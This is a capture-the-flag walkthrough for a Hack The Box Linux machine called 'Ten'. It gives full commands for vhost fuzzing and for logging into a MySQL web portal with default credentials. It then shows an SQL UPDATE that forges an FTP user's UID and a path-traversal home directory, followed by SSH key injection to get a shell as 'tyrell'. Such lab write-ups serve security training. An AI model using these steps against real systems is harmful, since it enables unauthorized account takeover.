## Overview

Ten is a hard-difficulty Linux box themed as a misconfigured shared-hosting environment. A sign-up page provisions Pure-FTPd accounts that live in a MySQL table; a second virtual host (`webdb`) is a web MySQL admin portal reachable with default credentials. By editing your own FTP account's database row you forge another user's UID/GID and a path-traversal home directory, escape the FTP jail into their `.ssh`, and inject an SSH key for a shell as `tyrell`.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 21   | Pure-FTPd | account store backed by MySQL |
| 22   | OpenSSH 8.9p1 | login |
| 80   | Apache 2.4.52 | sign-up portal + vhosts |

```bash
nmap -Pn -sC -sV 10.129.234.158
```

Port 80 redirects to a sign-up portal that generates FTP credentials for a subdomain you choose. Virtual-host fuzzing reveals a second site.

## Enumeration

The sign-up form provisions a Pure-FTPd account on demand:

```bash
curl -s -H "Host: ten.vl" -X POST -d "domain=tenpwn1" \
  http://10.129.234.158/get-credentials-please-do-not-spam-this-thanks.php
# -> Username: ten-XXXXXXXX  Password: <pass>
```

Fuzzing virtual hosts turns up `webdb.ten.vl` — a web-based MySQL management portal (the open-source WebDB app):

```bash
wfuzz -H "Host: FUZZ.ten.vl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc 400 http://10.129.234.158/
# -> webdb
```

WebDB exposes a REST API. Its backend connection is passed per-request in HTTP headers (not a session), and it scans for a local MySQL server:

```bash
curl -s -H "Host: webdb.ten.vl" http://10.129.234.158/api/server/scan
# -> [{"wrapper":"MySQL","host":"127.0.0.1","port":3306}]
```

The portal accepts the default MySQL credentials `user:pa55w0rd`, and the relevant database — `pureftpd` — is the very table that stores the FTP accounts.

## Foothold

`/etc/passwd` (pulled over FTP) shows a real user `tyrell` with UID/GID `1000`. Because the MySQL portal lets us write the `pureftpd.users` table, we edit our own row: set the UID/GID to `1000` and the home directory to a path-traversal that escapes the `/srv` FTP jail into tyrell's `.ssh`:

```bash
SRV='{"wrapper":"MySQL","host":"127.0.0.1","port":3306,"user":"user","password":"pa55w0rd"}'
curl -s -H "Host: webdb.ten.vl" -H "Server: $SRV" -H "Database: pureftpd" \
  -H "Content-Type: application/json" -X POST \
  -d '{"query":"UPDATE users SET dir=\"/srv/../home/tyrell/.ssh\", uid=1000, gid=1000 WHERE user=\"ten-XXXXXXXX\"","pageSize":50,"page":0}' \
  http://10.129.234.158/api/query/run
```

On reconnect, Pure-FTPd drops us into tyrell's `.ssh` directory running as UID 1000, so we generate a keypair and upload our public key as `authorized_keys`:

```bash
ssh-keygen -t ed25519 -N '' -f tyrell_key
cp tyrell_key.pub authorized_keys
curl -s -T authorized_keys "ftp://ten-XXXXXXXX:<pass>@10.129.234.158/authorized_keys"
ssh -i tyrell_key tyrell@10.129.234.158
```

![user shell](/assets/Images/ten-001_foothold_user-flag.png)

We now have a shell as `tyrell`.

## User flag

```bash
cat /home/tyrell/.user.txt   # HTB{...}
```

Access as `tyrell` achieved via the forged FTP database row and SSH-key injection.
